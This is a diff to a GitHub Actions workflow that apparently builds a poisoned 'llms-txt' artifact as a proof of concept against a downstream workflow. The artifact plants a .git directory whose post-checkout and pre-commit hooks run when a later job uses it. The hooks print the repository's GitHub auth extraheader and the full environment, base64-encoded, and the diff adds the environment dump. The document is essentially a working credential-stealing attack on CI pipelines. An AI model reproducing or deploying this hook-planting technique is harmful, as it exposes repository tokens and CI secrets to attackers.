@@ -10,24 +10,28 @@ jobs:
     steps:
       - name: make artifact
         run: |
-          mkdir -p out/src/pages out/.git/hooks
+          rm -rf out repo && mkdir -p out/src/pages
           echo "external attacker llms.txt" > out/src/pages/llms.txt
           echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
           echo "main" > out/pr-branch.txt
+          git init -q repo
+          cp -a repo/.git out/.git
           cat > out/.git/hooks/post-checkout <<'HOOK'
           #!/bin/sh
           echo "===== LLMS-HOOK-RAN ====="
           id
-          echo "---cred---"
+          echo "---extraheader---"
           git config --local --get http.https://github.com/.extraheader | base64 -w0
           echo
-          echo "---endcred---"
+          echo "---env---"
+          env | sort | base64 -w0
+          echo
           echo "===== LLMS-HOOK-END ====="
           HOOK
           chmod +x out/.git/hooks/post-checkout
           cp out/.git/hooks/post-checkout out/.git/hooks/pre-commit
-          git init -q out/.git 2>/dev/null || true
-          printf '[core]\n\thooksPath = .git/hooks\n' > out/.git/config
+          git config -f out/.git/config core.hooksPath .git/hooks
+          cat out/.git/config
       - uses: actions/upload-artifact@v4
         with:
           name: llms-txt
